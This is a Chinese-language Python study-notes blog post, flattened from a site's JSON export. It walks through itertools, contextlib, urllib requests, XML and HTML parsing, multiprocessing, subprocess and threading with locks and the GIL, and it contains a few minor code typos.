&#x27;Alice2008&#x27;)print(&#x27;ok&#x27;) itertools python的内建模块itertools提供了非常有用的用于操作迭代对象的函数。 无限迭代器 count count会从传入的参数开始不断的输出该数的下一个自然数 123456789&gt;&gt;&gt; import itertools&gt;&gt;&gt; natuals = itertools.count(1)&gt;&gt;&gt; for n in natuals:... print(n)...123... cycle cycle函数会将传入的参数无限循环输出： 123456789101112&gt;&gt;&gt; import itertools&gt;&gt;&gt; cs = itertools.cycle(&#x27;ABC&#x27;) # 注意字符串也是序列的一种&gt;&gt;&gt; for c in cs:... print(c)...&#x27;A&#x27;&#x27;B&#x27;&#x27;C&#x27;&#x27;A&#x27;&#x27;B&#x27;&#x27;C&#x27;... repeat repeat负责把一个元素无限重复下去，可以通过设置第二个参数来设置重复的次数 1234567&gt;&gt;&gt; ns = itertools.repeat(&#x27;A&#x27;, 3)&gt;&gt;&gt; for n in ns:... print(n)...AAA 由于生成器的特性，在使用for循环遍历生成器时，才会生成这些元素。 takewhile 无限序列虽然可以无限迭代下去，但是通常我们会通过takewhile()等函数根据条件判断来截取出一个有限的序列： 1234&gt;&gt;&gt; natuals = itertools.count(1)&gt;&gt;&gt; ns = itertools.takewhile(lambda x: x &lt;= 10, natuals)&gt;&gt;&gt; list(ns)[1, 2, 3, 4, 5, 6, 7, 8, 9, 10] 迭代器操作函数 chain chain()可以把一组迭代对象串联起来，形成一个更大的迭代器： 123&gt;&gt;&gt; for c in itertools.chain(&#x27;ABC&#x27;, &#x27;XYZ&#x27;):... print(c)# 迭代效果：&#x27;A&#x27; &#x27;B&#x27; &#x27;C&#x27; &#x27;X&#x27; &#x27;Y&#x27; &#x27;Z&#x27; groupby() groupby()把迭代器中相邻的重复元素挑出来放在一起： 1234567&gt;&gt;&gt; for key, group in itertools.groupby(&#x27;AAABBBCCAAA&#x27;):... print(key, list(group))...A [&#x27;A&#x27;, &#x27;A&#x27;, &#x27;A&#x27;]B [&#x27;B&#x27;, &#x27;B&#x27;, &#x27;B&#x27;]C [&#x27;C&#x27;, &#x27;C&#x27;]A [&#x27;A&#x27;, &#x27;A&#x27;, &#x27;A&#x27;] 实际上挑选规则是通过函数完成的，只要作用于函数的两个元素返回的值相等，这两个元素就被认为是在一组的，而函数返回值作为组的key。如果我们要忽略大小写分组，就可以让元素'A'和'a'都返回相同的key： 1234567&gt;&gt;&gt; for key, group in itertools.groupby(&#x27;AaaBBbcCAAa&#x27;, lambda c: c.upper()):... print(key, list(group))...A [&#x27;A&#x27;, &#x27;a&#x27;, &#x27;a&#x27;]B [&#x27;B&#x27;, &#x27;B&#x27;, &#x27;b&#x27;]C [&#x27;c&#x27;, &#x27;C&#x27;]A [&#x27;A&#x27;, &#x27;A&#x27;, &#x27;a&#x27;] 例子 我们使用刚刚学习的指示来打印一个PI的近似过程： 1234567891011121314151617181920212223242526# -*- coding: utf-8 -*-import itertoolsdef pi(N): &#x27; 计算pi的值 &#x27; # step 1: 创建一个奇数序列: 1, 3, 5, 7, 9, ... odd_num = itertools.count(start = 1, step = 2) # step 2: 取该序列的前N项: 1, 3, 5, 7, 9, ..., 2*N-1. firstN = itertools.takewhile(lambda x: x &lt;= 2*N-1, odd_num) # step 3: 添加正负符号并用4除: 4/1, -4/3, 4/5, -4/7, 4/9, ... firstN_devided4 = [4/val if i%2 == 0 else -4/val for i,val in enumerate(firstN)] # step 4: 求和: return sum(firstN_devided4)# 测试:print(pi(10))print(pi(100))print(pi(1000))print(pi(10000))assert 3.04 &lt; pi(10) &lt; 3.05assert 3.13 &lt; pi(100) &lt; 3.14assert 3.140 &lt; pi(1000) &lt; 3.141assert 3.1414 &lt; pi(10000) &lt; 3.1415print(&#x27;ok&#x27;)e contextlib 在之前的基础章节提到过with是通过上下文管理来实现文件的打开与关闭。 而事实上，实现了上下文管理的对象都能用于with语句。 只要实现了__enter__和__exit__两个方法，就能称之为上下文管理器： 123456789101112131415161718class Query(object): def __init__(self, name): self.name = name def __enter__(self): # 返回with as var语句中的var print(&#x27;Begin&#x27;) return self def __exit__(self, exc_type, exc_value, traceback): if exc_type: print(&#x27;Error&#x27;) else: print(&#x27;End&#x27;) def query(self): print(&#x27;Query info about %s...&#x27; % self.name) 这样我们就能使用with将其包裹： 12with Query(&#x27;Bob&#x27;) as q: q.query() 运行结果如下： 123BeginQuery info about Bob...End 此外python还提供了一种构造上下文处理器的装饰器@contextmanager，能让我们更方便的构造上下文处理器： 12345678910111213141516from contextlib import contextmanagerclass Query(object): def __init__(self, name): self.name = name def query(self): print(&#x27;Query info about %s...&#x27; % self.name)@contextmanagerdef create_query(name): print(&#x27;Begin&#x27;) q = Query(name) yeild q print(&#x27;End&#x27;) @contextmanager这个装饰器接受一个generator，用yield语句把with expression as var中的var输出出去，然后，with语句就可以正常地工作了： 12with create_query(&#x27;Bob&#x27;) as q: q.query() 以下是其他集中应用场景： 锁资源自动获取和释放的例子 123456789101112@contextmanagerdef locked(lock): lock.acquire() try: yield finally: lock.release()with locked(myLock): #代码执行到这里时，myLock已经自动上锁 pass #执行完后会，会自动释放锁 文件打开后自动管理的实现 1234567891011@contextmanagerdef myopen(filename, mode=&quot;r&quot;): f = open(filename,mode) try: yield f finally: f.close()with myopen(&quot;test.txt&quot;) as f: for line in f: print(line) 数据库事务的处理 12345678910111213141516@contextmanagerdef transaction(db): db.begin() try： yield except: db.rollback() raise else: db.commit()with transaction(mydb): mydb.cursor.execute(sql) mydb.cursor.execute(sql) mydb.cursor.execute(sql) mydb.cursor.execute(sql) 有时我们希望在某段代码执行前后，自动执行一些代码，就可以将其变成一个上下文管理器： 123456789@contextmanagerdef tag(name): print(&quot;&lt;%s&gt;&quot; % name) yield print(&quot;&lt;/%s&gt;&quot; % name)with tag(&quot;h1&quot;): print(&quot;hello&quot;) print(&quot;world&quot;) 运行结果如下： 1234&lt;h1&gt;helloworld&lt;/h1&gt; 代码的执行顺序是： with语句首先执行yield之前的语句，因此打印出&lt;h1&gt;； yield调用会执行with语句内部的所有语句，因此打印出hello和world； 最后执行yield之后的语句，打印出&lt;/h1&gt;。 因此，@contextmanager让我们通过编写generator来简化上下文管理。 nested函数 contextlib模块还提供了一个函数给我们：nested(mgr1,mgr2…mgrn)函数，用来嵌套多个上下文管理器，等同于下面的形式: 12345with mgr1: with mgr2: ... with mgrn: pass 示例如下： 12345678910111213141516171819202122232425from contextlib import contextmanagerfrom contextlib import nestedfrom contextlib import closing@contextmanagerdef my_context(name): print(&quot;enter&quot;) try: yield name finally: print(&quot;exit&quot;)#使用nested函数来调用多个管理器print(&quot;---------使用nested函数调用多个管理器-----------&quot;)with nested(my_context(&quot;管理器一&quot;), my_context(&quot;管理器二&quot;),my_context(&quot;管理器三&quot;)) as (m1,m2,m3): print(m1) print(m2) print(m3)#直接使用with来调用调用多个管理器print(&quot;---------使用with调用多个管理器-----------&quot;)with my_context(&quot;管理器一&quot;) as m1, my_context(&quot;管理器二&quot;) as m2, my_context(&quot;管理器三&quot;) as m3: print(m1) print(m2) print(m3) 输出结果如下： 1234567891011121314151617181920---------使用nested函数调用多个管理器-----------enterenterenter管理器一管理器二管理器三exitexitexit---------使用with调用多个管理器-----------enterenterenter管理器一管理器二管理器三exitexitexit closing对象 contextlib中还包含一个closing对象，这个对象就是一个上下文管理器，它的__exit__函数仅仅调用传入参数的close函数，closing对象的源码如下： 12345671 class closing(object):18 def __init__(self, thing):19 self.thing = thing20 def __enter__(self):21 return self.thing22 def __exit__(self, *exc_info):23 self.thing.close() 所以closeing上下文管理器仅使用于具有close()方法的资源对象。例如，如果我们通过urllib.urlopen打开一个网页，urlopen返回的request有close方法，所以我们就可以使用closing上下文管理器，如下： 123456import urllib, sysfrom contextlib import closingwith closing(urllib.urlopen(&#x27;http://www.yahoo.com&#x27;)) as f: for line in f: sys.stdout.write(line) urllib urllib提供了一系列用于操作URL的功能。 Get urllib的request模块可以非常方便地抓取URL内容，也就是发送一个GET请求到指定的页面，然后返回HTTP的响应： 例如，对豆瓣的一个URLhttps://api.douban.com/v2/book/2129650进行抓取，并返回响应： 12345678from urllib import requestwith request.urlopen(&#x27;https://api.douban.com/v2/book/2129650&#x27;) as f: data = f.read() print(&#x27;Status:&#x27;, f.status, f.reason) for k, v in f.getheaders(): print(&#x27;%s: %s&#x27; % (k, v)) print(&#x27;Data:&#x27;, data.decode(&#x27;utf-8&#x27;)) 可以看到HTTP响应的头和JSON数据： 1234567891011Status: 200 OKServer: nginxDate: Tue, 26 May 2015 10:02:27 GMTContent-Type: application/json; charset=utf-8Content-Length: 2049Connection: closeExpires: Sun, 1 Jan 2006 01:00:00 GMTPragma: no-cacheCache-Control: must-revalidate, no-cache, privateX-DAE-Node: pidl1Data: &#123;&quot;rating&quot;:&#123;&quot;max&quot;:10,&quot;numRaters&quot;:16,&quot;average&quot;:&quot;7.4&quot;,&quot;min&quot;:0&#125;,&quot;subtitle&quot;:&quot;&quot;,&quot;author&quot;:[&quot;廖雪峰编著&quot;],&quot;pubdate&quot;:&quot;2007-6&quot;,...&#125; 如果我们要想模拟浏览器发送GET请求，就需要使用Request对象，通过往Request对象添加HTTP头，我们就可以把请求伪装成浏览器。例如，模拟iPhone 6去请求豆瓣首页： 123456789from urllib import requestreq = request.Request(&#x27;http://www.douban.com/&#x27;)req.add_header(&#x27;User-Agent&#x27;, &#x27;Mozilla/6.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/8.0 Mobile/10A5376e Safari/8536.25&#x27;)with request.urlopen(req) as f: print(&#x27;Status:&#x27;, f.status, f.reason) for k, v in f.getheaders(): print(&#x27;%s: %s&#x27; % (k, v)) print(&#x27;Data:&#x27;, f.read().decode(&#x27;utf-8&#x27;)) 这样豆瓣会返回适合iPhone的移动版网页： 12345... &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, user-scalable=no, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0&quot;&gt; &lt;meta name=&quot;format-detection&quot; content=&quot;telephone=no&quot;&gt; &lt;link rel=&quot;apple-touch-icon&quot; sizes=&quot;57x57&quot; href=&quot;http://img4.douban.com/pics/cardkit/launcher/57.png&quot; /&gt;... Post 如果要以POST发送一个请求，只需要把参数data以bytes形式传入。 我们模拟一个微博登录，先读取登录的邮箱和口令，然后按照weibo.cn的登录页的格式以username=xxx&amp;password=xxx的编码传入： 12345678910111213141516171819202122232425from urllib import request, parseprint(&#x27;Login to weibo.cn...&#x27;)email = input(&#x27;Email: &#x27;)passwd = input(&#x27;Password: &#x27;)login_data = parse.urlencode([ (&#x27;username&#x27;, email), (&#x27;password&#x27;, passwd), (&#x27;entry&#x27;, &#x27;mweibo&#x27;), (&#x27;client_id&#x27;, &#x27;&#x27;), (&#x27;savestate&#x27;, &#x27;1&#x27;), (&#x27;ec&#x27;, &#x27;&#x27;), (&#x27;pagerefer&#x27;, &#x27;https://passport.weibo.cn/signin/welcome?entry=mweibo&amp;r=http%3A%2F%2Fm.weibo.cn%2F&#x27;)])req = request.Request(&#x27;https://passport.weibo.cn/sso/login&#x27;)req.add_header(&#x27;Origin&#x27;, &#x27;https://passport.weibo.cn&#x27;)req.add_header(&#x27;User-Agent&#x27;, &#x27;Mozilla/6.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/8.0 Mobile/10A5376e Safari/8536.25&#x27;)req.add_header(&#x27;Referer&#x27;, &#x27;https://passport.weibo.cn/signin/login?entry=mweibo&amp;res=wel&amp;wm=3349&amp;r=http%3A%2F%2Fm.weibo.cn%2F&#x27;)with request.urlopen(req, data=login_data.encode(&#x27;utf-8&#x27;)) as f: print(&#x27;Status:&#x27;, f.status, f.reason) for k, v in f.getheaders(): print(&#x27;%s: %s&#x27; % (k, v)) print(&#x27;Data:&#x27;, f.read().decode(&#x27;utf-8&#x27;)) 如果登录成功，我们获得的响应如下： 123456Status: 200 OKServer: nginx/1.2.0...Set-Cookie: SSOLoginState=1432620126; path=/; domain=weibo.cn...Data: &#123;&quot;retcode&quot;:20000000,&quot;msg&quot;:&quot;&quot;,&quot;data&quot;:&#123;...,&quot;uid&quot;:&quot;1658384301&quot;&#125;&#125; 如果登录失败，我们获得的响应如下： 12...Data: &#123;&quot;retcode&quot;:50011015,&quot;msg&quot;:&quot;\\u7528\\u6237\\u540d\\u6216\\u5bc6\\u7801\\u9519\\u8bef&quot;,&quot;data&quot;:&#123;&quot;username&quot;:&quot;example@python.org&quot;,&quot;errline&quot;:536&#125;&#125; Handler 如果还需要更复杂的控制，比如通过一个Proxy去访问网站，我们需要利用ProxyHandler来处理，示例代码如下： 123456proxy_handler = urllib.request.ProxyHandler(&#123;&#x27;http&#x27;: &#x27;http://www.example.com:3128/&#x27;&#125;)proxy_auth_handler = urllib.request.ProxyBasicAuthHandler()proxy_auth_handler.add_password(&#x27;realm&#x27;, &#x27;host&#x27;, &#x27;username&#x27;, &#x27;password&#x27;)opener = urllib.request.build_opener(proxy_handler, proxy_auth_handler)with opener.open(&#x27;http://www.example.com/login.html&#x27;) as f: pass XML DOM vs SAX 操作XML有两种方法： DOM SAX。 DOM会把整个XML读入内存，解析为树，因此占用内存大，解析慢，优点是可以任意遍历树的节点。 SAX是流模式，边读边解析，占用内存小，解析快，缺点是我们需要自己处理事件。 正常情况下，优先考虑SAX，因为DOM实在太占内存。 在Python中使用SAX解析XML非常简洁，通常我们关心的事件是start_element，end_element和char_data，准备好这3个函数，然后就可以解析xml了。 举个例子，当SAX解析器读到一个节点时： 1&lt;a href=&quot;/&quot;&gt;python&lt;/a&gt; 会产生3个事件： start_element事件，在读取&lt;a href=&quot;/&quot;&gt;时； char_data事件，在读取python时； end_element事件，在读取&lt;/a&gt;时。 用代码实验一下： 12345678910111213141516171819202122232425from xml.parsers.expat import ParserCreateclass DefaultSaxHandler(object): def start_element(self, name, attrs): print(&#x27;sax:start_element: %s, attrs: %s&#x27; % (name, str(attrs))) def end_element(self, name): print(&#x27;sax:end_element: %s&#x27; % name) def char_data(self, text): print(&#x27;sax:char_data: %s&#x27; % text)xml = r&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;ol&gt; &lt;li&gt;&lt;a href=&quot;/python&quot;&gt;Python&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;/ruby&quot;&gt;Ruby&lt;/a&gt;&lt;/li&gt;&lt;/ol&gt;&#x27;&#x27;&#x27;handler = DefaultSaxHandler()parser = ParserCreate()parser.StartElementHandler = handler.start_elementparser.EndElementHandler = handler.end_elementparser.CharacterDataHandler = handler.char_dataparser.Parse(xml) 需要注意的是读取一大段字符串时，CharacterDataHandler可能被多次调用，所以需要自己保存起来，在EndElementHandler里面再合并。 如果需要生成XML，99%的情况下需要生成的XML结构都是非常简单的，因此，最简单也是最有效的生成XML的方法是拼接字符串： 123456L = []L.append(r&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&#x27;)L.append(r&#x27;&lt;root&gt;&#x27;)L.append(encode(&#x27;some &amp; data&#x27;))L.append(r&#x27;&lt;/root&gt;&#x27;)return &#x27;&#x27;.join(L) 如果要生成复杂的XML则不建议使用XML，而改成JSON。 HTMLParser 果我们要编写一个搜索引擎，第一步是用爬虫把目标网站的页面抓下来，第二步就是解析该HTML页面，看看里面的内容到底是新闻、图片还是视频。 假设第一步已经完成了，第二步应该如何解析HTML呢？ HTML本质上是XML的子集，但是HTML的语法没有XML那么严格，所以不能用标准的DOM或SAX来解析HTML。 好在Python提供了HTMLParser来非常方便地解析HTML，只需简单几行代码： 123456789101112131415161718192021222324252627282930313233from html.parser import HTMLParserfrom html.entities import name2codepointclass MyHTMLParser(HTMLParser): def handle_starttag(self, tag, attrs): print(&#x27;&lt;%s&gt;&#x27; % tag) def handle_endtag(self, tag): print(&#x27;&lt;/%s&gt;&#x27; % tag) def handle_startendtag(self, tag, attrs): print(&#x27;&lt;%s/&gt;&#x27; % tag) def handle_data(self, data): print(data) def handle_comment(self, data): print(&#x27;&lt;!--&#x27;, data, &#x27;--&gt;&#x27;) def handle_entityref(self, name): print(&#x27;&amp;%s;&#x27; % name) def handle_charref(self, name): print(&#x27;&amp;#%s;&#x27; % name)parser = MyHTMLParser()parser.feed(&#x27;&#x27;&#x27;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;!-- test html parser --&gt; &lt;p&gt;Some &lt;a href=\\&quot;#\\&quot;&gt;html&lt;/a&gt; HTML&amp;nbsp;tutorial...&lt;br&gt;END&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&#x27;&#x27;&#x27;) feed()方法可以多次调用，也就是不一定一次把整个HTML字符串都塞进去，可以一部分一部分塞进去。 特殊字符有两种，一种是英文表示的&amp;nbsp;，一种是数字表示的&amp;#1234;，这两种字符都可以通过Parser解析出来。","categories":[{"name":"Python","slug":"Python","permalink":"http://enderxiao.github.io/categories/Python/"},{"name":"机器学习","slug":"机器学习","permalink":"http://enderxiao.github.io/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"计算机语言","slug":"计算机语言","permalink":"http://enderxiao.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%AF%AD%E8%A8%80/"},{"name":"研究生课程基础","slug":"研究生课程基础","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F%E8%AF%BE%E7%A8%8B%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://enderxiao.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"python","slug":"python","permalink":"http://enderxiao.github.io/tags/python/"},{"name":"进阶","slug":"进阶","permalink":"http://enderxiao.github.io/tags/%E8%BF%9B%E9%98%B6/"},{"name":"多进程","slug":"多进程","permalink":"http://enderxiao.github.io/tags/%E5%A4%9A%E8%BF%9B%E7%A8%8B/"},{"name":"多线程","slug":"多线程","permalink":"http://enderxiao.github.io/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"}]},{"title":"python进阶-多进程与多线程","slug":"python进阶-多进程与多线程","date":"2021-08-13T07:19:58.000Z","updated":"2024-07-30T11:26:33.920Z","comments":true,"path":"2021/08/13/python进阶-多进程与多线程/","permalink":"http://enderxiao.github.io/2021/08/13/python%E8%BF%9B%E9%98%B6-%E5%A4%9A%E8%BF%9B%E7%A8%8B%E4%B8%8E%E5%A4%9A%E7%BA%BF%E7%A8%8B/","excerpt":"python学习笔记，多线程与多进程部分","text":"python学习笔记，多线程与多进程部分 多进程 python中有很多多线程库，其中有一些是只能在Unix系操作系统上使用，原因是这些库是调用Unix系统中的一些特殊的系统调用实现的。 比如python的os模块封装了常见的系统调用，其中就包括fork，可以在python程序中轻松创建子进程。 Unix操作系统提供了一个fork()系统调用，普通的函数调用，调用一次，返回一次，但是fork()调用一次，返回两次，因为操作系统自动把当前进程（父进程）复制了一份（子进程），然后，分别在父进程和子进程内返回。 子进程永远返回0，而父进程返回子进程的ID。这样做的理由是，一个父进程可以fork出很多子进程，所以，父进程要记下每个子进程的ID，而子进程只需要调用getppid()就可以拿到父进程的ID。 在Unix系统下，我们可以这样创建子进程： 123456789101112import os# 获取当前进程的IDprint(&#x27;Process (%s) start...&#x27; % os.getpid())# Only works on Linux/Unix/Mac:pif = os.fork()if pid == 0: print(&quot;I am child process (%s) and my parent is %s.&quot; % (os.getpid(), os.getppid()))else: print(&quot;I (%s) just created a child process (%s).&quot; % (os.getpid(), pid) 运行结果如下： 123Process (876) start...I (876) just created a child process (877).I am child process (877) and my parent is 876. python是跨平台的，因此，windows下也应该有一个能进行多进程的模块，下面介绍multiprocessing模块 multiprocessing multiprocessing模块是一款跨平台版本的多进程模块，该模块提供了一个Process类来代表一个进程对象，下面的例子演示了启动一个子进程并等待其结束： 123456789101112131415from multiprocessing import Processimport os# 子进程要执行的代码def run_proc(name): print(&#x27;Run Child process %s (%s)...&#x27; % (name, os.getpid())) if __name__ == &#x27;__main__&#x27;: print(&#x27;Parent process %s.&#x27; % os.getpid()) p = Process(target = run_proc, args = (&#x27;test&#x27;,)) print(&#x27;Child process will start.&#x27;) p.start() p.join() print(&#x27;Child process end.&#x27;) 测试结果如下： 1234Parent process 9788.Child process will start.Run Child process test (14640)...Child process end. 创建子进程时，只需要传入一个执行函数和函数的参数，创建一个Process实例，用start()方法启动，这样创建进程比fork()还要简单。 join()方法可以等待子进程结束后再继续往下运行，通常用于进程间的同步。 Pool 如果要启动大量的子进程，可以用进程池的方式批量创建子进程： 12345678910111213141516171819from multiprocessing import Poolimport os, time, randomdef long_time_task(name): print(&#x27;Run task %s (%s)...&#x27; % (name, os.getpid())) start = time.time() time.sleep(random.random() * 3) end = time.time() print(&#x27;Task %s runs %0.2f seconds.&#x27; % (name, (end - start)))if __name__==&#x27;__main__&#x27;: print(&#x27;Parent process %s.&#x27; % os.getpid()) p = Pool(4) for i in range(5): p.apply_async(long_time_task, args=(i,)) print(&#x27;Waiting for all subprocesses done...&#x27;) p.close() p.join() print(&#x27;All subprocesses done.&#x27;) 运行结果： 12345678910111213Parent process 14096.Waiting for all subprocesses done...Run task 0 (6504)...Run task 1 (6176)...Run task 2 (16396)...Run task 3 (9388)...Task 3 runs 0.94 seconds.Run task 4 (9388)...Task 4 runs 0.14 seconds.Task 2 runs 1.89 seconds.Task 0 runs 2.51 seconds.Task 1 runs 2.68 seconds.All subprocesses done. 对Pool对象调用join()方法会等待所有子进程执行完毕，调用join()之前必须先调用close()，调用close()之后就不能继续添加新的Process了。 主义此处4号进程没有马上执行，而是等到3号进程结束之后才进行，这是因为我们设置Pool(4)，即大小为4，最多同时执行4个进程，如果将其设置为Pool(5)，5个进程就能同时开始执行。 由于Pool的默认大小是CPU的核数。 子进程 很多时候，子进程并不是自身，而是一个外部进程。我们创建了子进程后，还需要控制子进程的输入和输出。 subprocess模块可以让我们非常方便地启动一个子进程，然后控制其输入和输出。 下面引用一个例子： 12345import subprocessprint(&#x27;$ nslookup www.python.org&#x27;)r = subprocess.call([&#x27;nslookup&#x27;, &#x27;www.python.org&#x27;])print(&#x27;Exit code:&#x27;, r) 该例可以在python代码中运行命令nslookup www.python.org 运行结果： 12345678910$ nslookup www.python.orgServer: 192.168.19.4Address: 192.168.19.4#53Non-authoritative answer:www.python.org canonical name = python.map.fastly.net.Name: python.map.fastly.netAddress: 199.27.79.223Exit code: 0 如果子进程还需要输入，则可以通过communicate()方法输入： 1234567import subprocessprint(&#x27;$ nslookup&#x27;)p = subprocess.Popen([&#x27;nslookup&#x27;], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)output, err = p.communicate(b&#x27;set q=mx\\npython.org\\nexit\\n&#x27;)print(output.decode(&#x27;utf-8&#x27;))print(&#x27;Exit code:&#x27;, p.returncode) 上面的代码相当于在命令行执行命令nslookup，然后手动输入： 123set q=mxpython.orgexit 运行结果如下： 12345678910111213$ nslookupServer: 192.168.19.4Address: 192.168.19.4#53Non-authoritative answer:python.org mail exchanger = 50 mail.python.org.Authoritative answers can be found from:mail.python.org internet address = 82.94.164.166mail.python.org has AAAA address 2001:888:2000:d::a6Exit code: 0 进程间通讯 Process之间肯定是需要通信的，操作系统提供了很多机制来实现进程间的通信。Python的multiprocessing模块包装了底层的机制，提供了Queue、Pipes等多种方式来交换数据。 我们以Queue为例，在父进程中创建两个子进程，一个往Queue里写数据，一个从Queue里读数据： 1234567891011121314151617181920212223242526272829303132333435from multiprocessing import Process, Queueimport os, time, random# 写数据进程执行的代码:def write(q): print(&#x27;Process to write: %s&#x27; % os.getpid()) for value in [&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;]: print(&#x27;Put %s to queue...&#x27; % value) q.put(value) time.sleep(random.random())# 读数据进程执行的代码:def read(q): print(&#x27;Process to read: %s&#x27; % os.getpid()) while True: value = q.get(True) # Queue.get(block=True, timeout=None)# 从队列中移除并返回一个项目。如果可选参数 block 是 true 并且 timeout 是 None (默认值)，则在必要时阻塞至项目可得到。# 如果 timeout 是个正数，将最多阻塞 timeout 秒，如果在这段时间内项目不能得到，将引发 Empty 异常。# 反之 (block 是 false) , 如果一个项目立即可得到，则返回一个项目，否则引发 Empty 异常 (这种情况下，timeout 将被忽略)。 print(&#x27;Get %s from queue.&#x27; % value)if __name__==&#x27;__main__&#x27;: # 父进程创建Queue，并传给各个子进程： q = Queue() pw = Process(target=write, args=(q,)) pr = Process(target=read, args=(q,)) # 启动子进程pw，写入: pw.start() # 启动子进程pr，读取: pr.start() # 等待pw结束: pw.join() # pr进程里是死循环，无法等待其结束，只能强行终止: pr.terminate() 运行结果如下： 12345678Process to write: 7060Put A to queue...Process to read: 20224Get A from queue.Put B to queue...Get B from queue.Put C to queue...Get C from queue. 在Unix/Linux下，multiprocessing模块封装了fork()调用，使我们不需要关注fork()的细节。由于Windows没有fork调用，因此，multiprocessing需要“模拟”出fork的效果，父进程所有python对象都必须通过pickle序列化再传到子进程去，所以，如果multiprocessing在Windows下调用失败了，要先考虑是不是pickle失败了。 多线程 Threading 大部分高级语言通常都内置多线程支持，python也不例外，并且，python的线程是真正的Posix Thread，而不是模拟出来的线程。 Python的标准库提供了两个模块：_thread和threading，_thread是低级模块，threading是高级模块，对_thread进行了封装。绝大多数情况下，我们只需要使用threading这个高级模块。 下面举个例子： 1234567891011121314151617import time, threading# 新线程执行的代码def loop(): print(&#x27;thread %s is running...&#x27; % threading.current_thread().name) n = 0 while n &lt; 5: n = n + 1 print(&#x27;thread %s &gt;&gt;&gt; %s&#x27; % (threading.current_thread().name, n)) time.sleep(1) print(&#x27;thread %s ended.&#x27; % threading.current_thread().name) print(&#x27;thread %s is running&#x27; % threading.current_thread().name)t = threading.Thread(target = loop, name = &#x27;LoopThread&#x27;)t.start()t.join()print(&#x27;thread %s ended.&#x27; % threading.current_thread().name) 执行结果如下： 123456789thread MainThread is running...thread LoopThread is running...thread LoopThread &gt;&gt;&gt; 1thread LoopThread &gt;&gt;&gt; 2thread LoopThread &gt;&gt;&gt; 3thread LoopThread &gt;&gt;&gt; 4thread LoopThread &gt;&gt;&gt; 5thread LoopThread ended.thread MainThread ended. 由于任何进程默认就会启动一个线程，我们把该线程称为主线程，主线程又可以启动新的线程，Python的threading模块有个current_thread()函数，它永远返回当前线程的实例。主线程实例的名字叫MainThread，子线程的名字在创建时指定，我们用LoopThread命名子线程。名字仅仅在打印时用来显示，完全没有其他意义，如果不起名字Python就自动给线程命名为Thread-1，Thread-2…… Lock 进程操作中，对于同一个变量，每个进程会各自拷贝一份，相互并不影响，但在线程操作中，变量与所有线程共性，任何线程对某一变量造成影响后，该影响会被传递到所有其他线程中。因此，线程之间如果需要访问一个共享的数据，需要处理同步与互斥 下面介绍一个错误操作的例子： 12345678910111213141516171819202122import time, threading# 假定这是你的银行存款:balance = 0def change_it(n): # 先存后取，结果应该为0: global balance balance = balance + n balance = balance - ndef run_thread(n): for i in range(2000000): change_it(n)t1 = threading.Thread(target=run_thread, args=(5,))t2 = threading.Thread(target=run_thread, args=(8,))t1.start()t2.start()t1.join()t2.join()print(balance) 得到的结果如下： 1-3 然而这个结果显然没有意义，因为每次运行都会得到不同的结果。 但理论上来说，结果应该是0。 原因是高级语言在实际运行时，需要经过层层翻译，而balance = balance + n这行代码实际翻译为汇编语言时，需要经过至少三个步骤： 取数 运算 存数 当两个线程交替运行时，如果T1进行刀运算时，还没进行存数，但T2进入了存数阶段，村数结束后，T1也进入村数阶段，则T1村入的数将覆盖T2的结果。 经过上面的分析，我们发现两个线程对balance的访问是互斥的。 python中的threading.lock()为我们提供了实现互斥的功能，于是我们使用如下方式修改run_thread()函数： 12345678910111213balance = 0lock = threading.Lock()def run_thread(n): for i in range(100000): # 先要获取锁: lock.acquire() try: # 放心地改吧: change_it(n) finally: # 改完了一定要释放锁: lock.release() 当多个线程同时执行lock.acquire()时，只有一个线程能成功地获取锁，然后继续执行代码，其他线程就继续等待直到获得锁为止。 但是使用临界区的方式实现进程同步与互斥时，需要注意仔细分析避免死锁的发生。 多CPU 我们试试使用多个死循环线程： 12345678910import threading, multiprocessingdef loop(): x = 0 while True: x = x ^ 1for i in range(multiprocessing.cpu_count()): t = threading.Thread(target=loop) t.start() 我们使用TaskManager查看CPU的占用情况，但我们发现CPU占用率大约是25%左右，这说明死循环大约只占用了一个CPU核心，并没有跑满我的全部4核CPU。 但是用C、C++或Java来改写相同的死循环，直接可以把全部核心跑满。 这是因为Python的线程虽然是真正的线程，但解释器执行代码时，有一个GIL锁：Global Interpreter Lock，任何python线程执行前，必须先获得GIL锁，然后，每执行100条字节码，解释器就自动释放GIL锁，让别的线程有机会执行。这个GIL全局锁实际上把所有线程的执行代码都给上了锁，所以，多线程在Python中只能交替执行，即使100个线程跑在100核CPU上，也只能用到1个核。 GIL是Python解释器设计的历史遗留问题，通常我们用的解释器是官方实现的CPython，要真正利用多核，除非重写一个不带GIL的解释器。 所以，在Python中，可以使用多线程，但不要指望能有效利用多核。如果一定要通过多线程利用多核，那只能通过C扩展来实现，不过这样就失去了Python简单易用的特点。 不过，Python虽然不能利用多线程实现多核任务，但可以通过多进程实现多核任务。多个Python进程有各自独立的GIL锁，互不影响。 ThreadLocal 由于线程存在的同步与互斥问题。我们希望线程能够尽可能的去操作自己的局部变量，但局部变量在传递的过程中比较麻烦，例如： 12345678910111213def process_student(name): std = Student(name) # std是局部变量，但是每个函数都要用它，因此必须传进去： do_task_1(std) do_task_2(std)def do_task_1(std): do_subtask_1(std) do_subtask_2(std)def do_task_2(std): do_subtask_2(std) do_subtask_2(std) 